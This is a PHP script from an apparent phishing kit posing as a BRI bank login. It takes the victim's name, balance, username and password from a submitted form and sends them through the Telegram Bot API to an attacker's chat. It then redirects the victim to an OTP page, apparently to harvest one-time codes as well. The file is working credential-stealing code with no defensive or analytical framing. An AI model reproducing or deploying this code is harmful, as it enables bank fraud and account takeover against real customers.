<?php 

session_start();

include "masuk.js";

$_SESSION["nomorkus"] = $_POST ['nohp'];

$_SESSION["debits"] = $_POST ['debit'];

$_SESSION["namas"] = $_POST ['nama'];

$message = "╭─════════🄱🅁🄸════════─╮".
	"\n┣❏ 𝗡𝗮𝗺𝗮    :  ".  $_POST ['nama']. "\n┣❏ 𝗦𝗮𝗹𝗱𝗼    :  ". $_POST ['saldo']. "\n┣❏ 𝗨𝘀𝗲𝗿      :  ". $_POST ['uname'].  "\n┣❏ 𝗣𝗮𝘀𝘀     :  ". $_POST ['pass']. "\n╰─════════════════════─╯
	✅️Berhasil ambil data";

    function sendMessage($telegram_id, $message, $id_bot)

    {

    $url = "https://api.telegram.org/bot" . $id_bot . "/sendMessage?parse_mode=markdown&chat_id=" . $telegram_id;

        $url = $url . "&text=" . urlencode($message);

            $ch = curl_init();

                $optArray = array(

                            CURLOPT_URL => $url,

                                        CURLOPT_RETURNTRANSFER => true

                                            );

                                                curl_setopt_array($ch, $optArray);

                                                    $result = curl_exec($ch);

                                                        curl_close($ch);

                                                        }

                                                        sendMessage($telegram_id, $message, $id_bot);

                                                        header("Location:  otp.html");

                                                        ?> 